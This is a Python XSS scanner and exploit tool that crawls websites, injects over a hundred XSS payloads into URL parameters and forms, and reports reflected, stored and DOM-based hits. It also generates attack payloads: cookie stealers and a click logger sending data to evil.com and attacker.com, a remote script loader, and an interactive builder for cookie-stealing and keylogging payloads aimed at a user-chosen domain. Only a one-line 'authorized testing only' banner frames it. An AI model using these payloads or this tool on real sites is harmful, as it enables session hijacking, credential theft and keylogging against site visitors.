import requests
import time
import random
import re
import urllib.parse
from bs4 import BeautifulSoup

class AdvancedXSSScanner:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
        self.xss_payloads = self.load_xss_payloads()
        self.vulnerabilities = []
        self.checked_urls = set()
    
    def load_xss_payloads(self):
        return [
            '<script>alert("XSS")</script>',
            '<img src="x" onerror="alert(\'XSS\')">',
            '<svg onload="alert(\'XSS\')">',
            '<body onload="alert(\'XSS\')">',
            '<input type="text" value="<script>alert(\'XSS\')</script>">',
            '<iframe src="javascript:alert(\'XSS\')">',
            '<object data="javascript:alert(\'XSS\')">',
            '<embed src="javascript:alert(\'XSS\')">',
            '<video><source onerror="alert(\'XSS\')">',
            '<audio src="x" onerror="alert(\'XSS\')">',
            '<form><button formaction="javascript:alert(\'XSS\')">',
            '<details open ontoggle="alert(\'XSS\')">',
            '<select onfocus="alert(\'XSS\')">',
            '<textarea onfocus="alert(\'XSS\')">',
            '<keygen autofocus onfocus="alert(\'XSS\')">',
            '<marquee onstart="alert(\'XSS\')">',
            '<isindex type="image" src="1" onerror="alert(\'XSS\')">',
            '<script>document.location="http://evil.com/steal?c="+document.cookie</script>',
            '<img src="x" onerror="fetch(\'http://evil.com/steal?cookie=\'+document.cookie)">',
            '<script>new Image().src="http://evil.com/steal?cookie="+document.cookie;</script>',
            '<div onmouseover="alert(\'XSS\')">Hover me</div>',
            '<a href="javascript:alert(\'XSS\')">Click me</a>',
            '<style>@import "javascript:alert(\'XSS\')";</style>',
            '<link rel="stylesheet" href="javascript:alert(\'XSS\')">',
            '<meta http-equiv="refresh" content="0;url=javascript:alert(\'XSS\')">',
            '<table background="javascript:alert(\'XSS\')">',
            '<base href="javascript:alert(\'XSS\')">',
            '<applet code="javascript:alert(\'XSS\')">',
            '<isindex action="javascript:alert(\'XSS\')">',
            '<xss id="xss">I am safe</xss><script>alert(xss.innerHTML)</script>',
            '" onmouseover="alert(\'XSS\')',
            "' onmouseover='alert(\"XSS\")",
            '><script>alert(\'XSS\')</script>',
            '</script><script>alert(\'XSS\')</script>',
            'javascript:alert(document.domain)',
            '"><img src="x" onerror="alert(\'XSS\')">',
            "'><img src='x' onerror='alert(\"XSS\")'>",
            '"><svg onload="alert(\'XSS\')">',
            "'><svg onload='alert(\"XSS\")'>",
            '"><iframe src="javascript:alert(\'XSS\')">',
            "'><iframe src='javascript:alert(\"XSS\")'>",
            '"><body onload="alert(\'XSS\')">',
            "'><body onload='alert(\"XSS\")'>",
            '"><video><source onerror="alert(\'XSS\')">',
            "'><video><source onerror='alert(\"XSS\")'>",
            '"><audio src="x" onerror="alert(\'XSS\')">',
            "'><audio src='x' onerror='alert(\"XSS\")'>",
            '"><details open ontoggle="alert(\'XSS\')">',
            "'><details open ontoggle='alert(\"XSS\")'>",
            '"><select onfocus="alert(\'XSS\')">',
            "'><select onfocus='alert(\"XSS\")'>",
            '"><textarea onfocus="alert(\'XSS\')">',
            "'><textarea onfocus='alert(\"XSS\")'>",
            '"><marquee onstart="alert(\'XSS\')">',
            "'><marquee onstart='alert(\"XSS\")'>",
            '<script src="data:text/javascript,alert(\'XSS\')"></script>',
            '<script>eval(atob(\'YWxlcnQoIlhTUyIp\'))</script>',
            '<script>window.location=window.location.hash.slice(1)</script>',
            '<script>$.getScript("//evil.com/xss.js")</script>',
            '<script src="http://evil.com/xss.js"></script>',
            '<img src="x:” onerror=”alert(\'XSS\')">',
            '<img src="x:`” onerror=”alert(\'XSS\')`">',
            '<img src="x:””” onerror=”alert(\'XSS\')">',
            '<img src="x:"”” onerror=”alert(\'XSS\')">',
            '<img src="x:" onerror=”alert(\'XSS\')">',
            '<img src=x onerror="&#x61;lert(\'XSS\')">',
            '<img src=x onerror="&#97;lert(\'XSS\')">',
            '<img src=x onerror="alert&#40;\'XSS\'&#41;">',
            '<img src=x onerror="alert&apos;XSS&apos;">',
            '<img src=x onerror="alert&apos;XSS&apos;">',
            '<img src=x onerror="String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41)">',
            '<img src=x onerror="eval(\'ale\'+\'rt(\\\'XSS\\\')\')">',
            '<img src=x onerror="window[\\'al\\'+\\'ert\\'](\\'XSS\\')">',
            '<img src=x onerror="this[\\'al\\'+\\'ert\\'](\\'XSS\\')">',
            '<img src=x onerror="self[\\'al\\'+\\'ert\\'](\\'XSS\\')">',
            '<img src=x onerror="top[\\'al\\'+\\'ert\\'](\\'XSS\\')">',
            '<img src=x onerror="parent[\\'al\\'+\\'ert\\'](\\'XSS\\')">',
            '<img src=x onerror="frames[\\'al\\'+\\'ert\\'](\\'XSS\\')">',
            '<img src=x onerror="globalThis[\\'al\\'+\\'ert\\'](\\'XSS\\')">',
            '<img src=x onerror="[].sort.constructor(\\'alert(\\\\\\'XSS\\\\\\')\\')()">',
            '<img src=x onerror="Function(\\'alert(\\\\\\'XSS\\\\\\')\\')()">',
            '<img src=x onerror="(new Function(\\'alert(\\\\\\'XSS\\\\\\')\\'))()">',
            '<img src=x onerror="eval.call(null,\\'alert\\\\\\\\\\\\\\'XSS\\\\\\\\\\\\\\'\\')">',
            '<img src=x onerror="(0,eval)(\\'alert(\\\\\\'XSS\\\\\\')\\')">',
            '<img src=x onerror="[].map.constructor(\\'alert(\\\\\\'XSS\\\\\\')\\')()">',
            '<img src=x onerror="Array.map.constructor(\\'alert(\\\\\\'XSS\\\\\\')\\')()">',
            '<img src=x onerror="Set.constructor(\\'alert(\\\\\\'XSS\\\\\\')\\')()">',
            '<img src=x onerror="Map.constructor(\\'alert(\\\\\\'XSS\\\\\\')\\')()">',
            '<img src=x onerror="WeakSet.constructor(\\'alert(\\\\\\'XSS\\\\\\')\\')()">',
            '<img src=x onerror="WeakMap.constructor(\\'alert(\\\\\\'XSS\\\\\\')\\')()">',
            '<img src=x onerror="Promise.constructor(\\'alert(\\\\\\'XSS\\\\\\')\\')()">',
            '<img src=x onerror="Proxy.constructor(\\'alert(\\\\\\'XSS\\\\\\')\\')()">',
            '<img src=x onerror="Reflect.constructor(\\'alert(\\\\\\'XSS\\\\\\')\\')()">',
            '<img src=x onerror="Intl.constructor(\\'alert(\\\\\\'XSS\\\\\\')\\')()">',
            '<img src=x onerror="Math.constructor(\\'alert(\\\\\\'XSS\\\\\\')\\')()">',
            '<img src=x onerror="Date.constructor(\\'alert(\\\\\\'XSS\\\\\\')\\')()">',
            '<img src=x onerror="JSON.constructor(\\'alert(\\\\\\'XSS\\\\\\')\\')()">',
            '<img src=x onerror="RegExp.constructor(\\'alert(\\\\\\'XSS\\\\\\')\\')()">',
            '<img src=x onerror="Error.constructor(\\'alert(\\\\\\'XSS\\\\\\')\\')()">',
            '<img src=x onerror="ArrayBuffer.constructor(\\'alert(\\\\\\'XSS\\\\\\')\\')()">',
            '<img src=x onerror="SharedArrayBuffer.constructor(\\'alert(\\\\\\'XSS\\\\\\')\\')()">',
            '<img src=x onerror="DataView.constructor(\\'alert(\\\\\\'XSS\\\\\\')\\')()">',
            '<img src=x onerror="Atomics.constructor(\\'alert(\\\\\\'XSS\\\\\\')\\')()">',
            '<img src=x onerror="WebAssembly.constructor(\\'alert(\\\\\\'XSS\\\\\\')\\')()">'
        ]
    
    def extract_forms(self, url):
        try:
            response = self.session.get(url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            forms = []
            for form in soup.find_all('form'):
                form_details = {
                    'action': form.get('action'),
                    'method': form.get('method', 'get').lower(),
                    'inputs': []
                }
                
                for input_tag in form.find_all('input'):
                    input_type = input_tag.get('type', 'text')
                    input_name = input_tag.get('name')
                    input_value = input_tag.get('value', '')
                    
                    if input_name and input_type in ['text', 'search', 'email', 'password', 'url']:
                        form_details['inputs'].append({
                            'name': input_name,
                            'type': input_type,
                            'value': input_value
                        })
                
                for textarea in soup.find_all('textarea'):
                    textarea_name = textarea.get('name')
                    if textarea_name:
                        form_details['inputs'].append({
                            'name': textarea_name,
                            'type': 'textarea',
                            'value': textarea.get_text()
                        })
                
                if form_details['inputs']:
                    forms.append(form_details)
            
            return forms
        
        except Exception as e:
            print(f"[ERROR] Failed to extract forms from {url}: {e}")
            return []
    
    def extract_url_params(self, url):
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        
        param_list = []
        for param, values in params.items():
            if values:
                param_list.append({
                    'name': param,
                    'value': values[0],
                    'type': 'url'
                })
        
        return param_list
    
    def test_reflected_xss(self, url, param_name, param_value, payload):
        parsed_url = urllib.parse.urlparse(url)
        query_params = urllib.parse.parse_qs(parsed_url.query)
        
        test_params = {}
        for param, values in query_params.items():
            test_params[param] = values[0] if values else ''
        
        test_params[param_name] = payload
        
        test_url = urllib.parse.urlunparse((
            parsed_url.scheme,
            parsed_url.netloc,
            parsed_url.path,
            parsed_url.params,
            urllib.parse.urlencode(test_params),
            parsed_url.fragment
        ))
        
        try:
            response = self.session.get(test_url, timeout=10)
            
            if payload in response.text:
                return {
                    'vulnerable': True,
                    'type': 'reflected',
                    'url': test_url,
                    'param': param_name,
                    'payload': payload,
                    'response_length': len(response.text)
                }
        
        except Exception as e:
            pass
        
        return {'vulnerable': False}
    
    def test_stored_xss(self, url, form_data, payload):
        try:
            response = self.session.post(url, data=form_data, timeout=10)
            
            if response.status_code in [200, 201, 302]:
                check_response = self.session.get(url, timeout=10)
                
                if payload in check_response.text:
                    return {
                        'vulnerable': True,
                        'type': 'stored',
                        'url': url,
                        'payload': payload,
                        'response_code': response.status_code
                    }
        
        except Exception as e:
            pass
        
        return {'vulnerable': False}
    
    def test_dom_xss(self, url, payload):
        try:
            response = self.session.get(url, timeout=10)
            
            soup = BeautifulSoup(response.text, 'html.parser')
            scripts = soup.find_all('script')
            
            for script in scripts:
                script_text = script.get_text()
                if 'location.hash' in script_text or 'document.URL' in script_text or 'document.documentURI' in script_text:
                    test_url = f"{url}#{payload}"
                    
                    test_response = self.session.get(test_url, timeout=10)
                    
                    if payload in test_response.text:
                        return {
                            'vulnerable': True,
                            'type': 'dom',
                            'url': test_url,
                            'payload': payload
                        }
        
        except Exception as e:
            pass
        
        return {'vulnerable': False}
    
    def scan_url(self, url):
        print(f"\n[SCANNING] {url}")
        
        if url in self.checked_urls:
            return []
        
        self.checked_urls.add(url)
        vulnerabilities = []
        
        url_params = self.extract_url_params(url)
        forms = self.extract_forms(url)
        
        print(f"[INFO] Found {len(url_params)} URL parameters and {len(forms)} forms")
        
        for param in url_params:
            param_name = param['name']
            original_value = param['value']
            
            print(f"[TESTING] URL parameter: {param_name}")
            
            test_payloads = random.sample(self.xss_payloads, 5)
            
            for payload in test_payloads:
                result = self.test_reflected_xss(url, param_name, original_value, payload)
                
                if result.get('vulnerable'):
                    vulnerabilities.append({
                        'url': result['url'],
                        'parameter': param_name,
                        'payload': payload,
                        'type': result['type'],
                        'details': f"Reflected XSS in parameter {param_name}"
                    })
                    
                    print(f"[VULNERABLE] {param_name} with payload: {payload[:50]}...")
                    break
            
            time.sleep(0.3)
        
        for form in forms:
            form_url = urllib.parse.urljoin(url, form['action']) if form['action'] else url
            form_method = form['method']
            
            print(f"[TESTING] Form at {form_url}")
            
            for input_field in form['inputs']:
                field_name = input_field['name']
                field_type = input_field['type']
                
                form_data = {}
                for f in form['inputs']:
                    form_data[f['name']] = f['value'] if f['value'] else 'test'
                
                test_payloads = random.sample(self.xss_payloads, 3)
                
                for payload in test_payloads:
                    test_data = form_data.copy()
                    test_data[field_name] = payload
                    
                    if form_method == 'post':
                        result = self.test_stored_xss(form_url, test_data, payload)
                    else:
                        test_url = f"{form_url}?{urllib.parse.urlencode(test_data)}"
                        result = self.test_reflected_xss(test_url, field_name, payload, payload)
                    
                    if result.get('vulnerable'):
                        vulnerabilities.append({
                            'url': form_url,
                            'parameter': field_name,
                            'payload': payload,
                            'type': result['type'],
                            'details': f"{result['type'].title()} XSS in form field {field_name}"
                        })
                        
                        print(f"[FORM VULNERABLE] {field_name} with payload: {payload[:50]}...")
                        break
                
                time.sleep(0.5)
        
        dom_result = self.test_dom_xss(url, '<script>alert("DOM_XSS")</script>')
        if dom_result.get('vulnerable'):
            vulnerabilities.append({
                'url': dom_result['url'],
                'parameter': 'DOM',
                'payload': dom_result['payload'],
                'type': 'dom',
                'details': 'DOM-based XSS via location hash'
            })
            print(f"[DOM VULNERABLE] DOM-based XSS detected")
        
        return vulnerabilities
    
    def crawl_and_scan(self, start_url, max_depth=2, max_pages=15):
        print(f"\n[CRAWLING] Starting from {start_url}")
        print(f"Depth: {max_depth} | Max pages: {max_pages}")
        
        visited = set()
        to_visit = [(start_url, 0)]
        all_vulnerabilities = []
        
        while to_visit and len(visited) < max_pages:
            current_url, depth = to_visit.pop(0)
            
            if current_url in visited or depth > max_depth:
                continue
            
            visited.add(current_url)
            print(f"\n[PAGE {len(visited)}/{max_pages}] Scanning: {current_url}")
            
            try:
                vulnerabilities = self.scan_url(current_url)
                all_vulnerabilities.extend(vulnerabilities)
                
                response = self.session.get(current_url, timeout=10)
                soup = BeautifulSoup(response.text, 'html.parser')
                
                for link in soup.find_all('a', href=True):
                    href = link['href']
                    if href.startswith('http'):
                        full_url = href
                    else:
                        full_url = urllib.parse.urljoin(current_url, href)
                    
                    if full_url not in visited:
                        to_visit.append((full_url, depth + 1))
                
                time.sleep(1)
            
            except Exception as e:
                print(f"[ERROR] Failed to scan {current_url}: {e}")
        
        return all_vulnerabilities
    
    def generate_report(self, vulnerabilities):
        if not vulnerabilities:
            print("\n[REPORT] No XSS vulnerabilities found")
            return None
        
        print("\n" + "="*70)
        print("XSS VULNERABILITY REPORT")
        print("="*70)
        print(f"Total XSS Vulnerabilities Found: {len(vulnerabilities)}")
        
        by_type = {}
        for vuln in vulnerabilities:
            vuln_type = vuln['type']
            by_type[vuln_type] = by_type.get(vuln_type, 0) + 1
        
        print("\nBy Vulnerability Type:")
        for vuln_type, count in by_type.items():
            print(f"  {vuln_type}: {count}")
        
        print("\nTop 10 Vulnerabilities Found:")
        for i, vuln in enumerate(vulnerabilities[:10], 1):
            print(f"\n{i}. Type: {vuln['type'].upper()}")
            print(f"   URL: {vuln['url'][:80]}...")
            print(f"   Parameter: {vuln['parameter']}")
            print(f"   Payload: {vuln['payload'][:60]}...")
            print(f"   Details: {vuln['details']}")
        
        if len(vulnerabilities) > 10:
            print(f"\n... and {len(vulnerabilities) - 10} more vulnerabilities")
        
        print("\n" + "="*70)
        
        report_data = {
            'total_vulnerabilities': len(vulnerabilities),
            'by_type': by_type,
            'vulnerabilities': vulnerabilities[:20]
        }
        
        return report_data
    
    def generate_exploit_payloads(self, vuln_info):
        print(f"\n[EXPLOIT] Generating payloads for {vuln_info['type']} XSS")
        
        exploit_payloads = []
        
        if vuln_info['type'] == 'reflected':
            exploit_payloads = [
                '<script>alert(document.domain)</script>',
                '<script>alert(document.cookie)</script>',
                '<script>new Image().src="http://attacker.com/steal?cookie="+document.cookie</script>',
                '<script>fetch("http://attacker.com/steal", {method:"POST",body:document.cookie})</script>',
                '<script>location.href="http://attacker.com/steal?data="+btoa(document.cookie)</script>'
            ]
        elif vuln_info['type'] == 'stored':
            exploit_payloads = [
                '<script>setInterval(function(){new Image().src="http://attacker.com/log?data="+btoa(document.cookie)},5000)</script>',
                '<script>document.addEventListener("click",function(e){fetch("http://attacker.com/keylog",{method:"POST",body:e.key})})</script>',
                '<iframe src="javascript:document.write(\'<script>alert(\\\'PWNED\\\')</script>\')"></iframe>',
                '<img src="x" onerror="let s=document.createElement(\'script\');s.src=\'http://attacker.com/evil.js\';document.body.appendChild(s)">'
            ]
        elif vuln_info['type'] == 'dom':
            exploit_payloads = [
                '#<script>alert(1)</script>',
                '#javascript:alert(document.domain)',
                '#" onload="alert(1)',
                "#' onload='alert(1)"
            ]
        
        print("\nRecommended Exploit Payloads:")
        for i, payload in enumerate(exploit_payloads, 1):
            print(f"{i}. {payload}")
        
        return exploit_payloads

def main():
    print("\n" + "="*70)
    print("AIO TOOLS - ADVANCED XSS SCANNER")
    print("="*70)
    print("For authorized security testing only!")
    print("="*70)
    
    scanner = AdvancedXSSScanner()
    
    try:
        print("\n[OPTIONS]")
        print("1. Quick XSS scan (single URL)")
        print("2. Deep XSS scan (crawl website)")
        print("3. Test specific parameter")
        print("4. Load URLs from file")
        print("5. Generate XSS payloads")
        
        choice = input("\nSelect option (1-5): ").strip()
        
        if choice == '1':
            url = input("Enter URL to scan: ").strip()
            if not url.startswith('http'):
                url = 'http://' + url
            
            vulnerabilities = scanner.scan_url(url)
            report = scanner.generate_report(vulnerabilities)
            
            if report and report['total_vulnerabilities'] > 0:
                exploit = input("\nGenerate exploit payloads? (y/n): ").strip().lower()
                if exploit == 'y':
                    for vuln in vulnerabilities[:3]:
                        scanner.generate_exploit_payloads(vuln)
        
        elif choice == '2':
            url = input("Enter starting URL: ").strip()
            if not url.startswith('http'):
                url = 'http://' + url
            
            depth = input("Crawl depth (default 2): ").strip()
            depth = int(depth) if depth.isdigit() else 2
            
            max_pages = input("Max pages to scan (default 15): ").strip()
            max_pages = int(max_pages) if max_pages.isdigit() else 15
            
            vulnerabilities = scanner.crawl_and_scan(url, depth, max_pages)
            scanner.generate_report(vulnerabilities)
        
        elif choice == '3':
            url = input("Enter URL with parameters: ").strip()
            param = input("Enter parameter name to test: ").strip()
            
            test_payloads = scanner.xss_payloads[:10]
            
            print(f"\n[TESTING] {param} on {url}")
            
            for payload in test_payloads:
                result = scanner.test_reflected_xss(url, param, 'test', payload)
                
                if result.get('vulnerable'):
                    print(f"\n[VULNERABLE] Payload: {payload[:50]}...")
                    print(f"Test URL: {result['url'][:80]}...")
                else:
                    print(f"[SAFE] Payload: {payload[:30]}...")
                
                time.sleep(0.5)
        
        elif choice == '4':
            filename = input("Enter filename with URLs: ").strip()
            
            try:
                with open(filename, 'r') as f:
                    urls = [line.strip() for line in f if line.strip()]
                
                print(f"[LOADED] {len(urls)} URLs")
                
                all_vulns = []
                for url in urls[:5]:
                    try:
                        vulns = scanner.scan_url(url)
                        all_vulns.extend(vulns)
                    except:
                        pass
                
                scanner.generate_report(all_vulns)
            
            except FileNotFoundError:
                print("[ERROR] File not found")
        
        elif choice == '5':
            print("\n[XSS PAYLOAD GENERATOR]")
            print("\nSelect payload type:")
            print("1. Basic alert")
            print("2. Cookie stealer")
            print("3. Keylogger")
            print("4. Redirect")
            print("5. Custom")
            
            payload_choice = input("\nChoice (1-5): ").strip()
            
            if payload_choice == '1':
                print("\nBasic Alert Payloads:")
                print('<script>alert("XSS")</script>')
                print('<img src="x" onerror="alert(\'XSS\')">')
                print('<svg onload="alert(\'XSS\')">')
            
            elif payload_choice == '2':
                domain = input("Enter your domain for cookie stealing: ").strip()
                print(f"\nCookie Stealer Payloads:")
                print(f'<script>new Image().src="http://{domain}/steal?cookie="+document.cookie</script>')
                print(f'<img src="x" onerror="fetch(\'http://{domain}/steal\',{{method:\'POST\',body:document.cookie}})">')
            
            elif payload_choice == '3':
                domain = input("Enter your domain for keylogging: ").strip()
                print(f"\nKeylogger Payloads:")
                print(f'<script>document.onkeypress=function(e){{new Image().src="http://{domain}/key?k="+e.key}}</script>')
            
            elif payload_choice == '4':
                redirect_url = input("Enter redirect URL: ").strip()
                print(f"\nRedirect Payloads:")
                print(f'<script>location.href="{redirect_url}"</script>')
                print(f'<meta http-equiv="refresh" content="0;url={redirect_url}">')
            
            elif payload_choice == '5':
                js_code = input("Enter JavaScript code to execute: ").strip()
                print(f"\nCustom Payloads:")
                print(f'<script>{js_code}</script>')
                print(f'<img src="x" onerror="{js_code}">')
                print(f'<body onload="{js_code}">')
        
        else:
            print("[ERROR] Invalid choice")
    
    except KeyboardInterrupt:
        print("\n[INTERRUPT] Scan stopped")
    except Exception as e:
        print(f"[ERROR] {e}")
    
    print("\n[COMPLETE] XSS Scanner finished")
    time.sleep(2)

if __name__ == "__main__":
    main()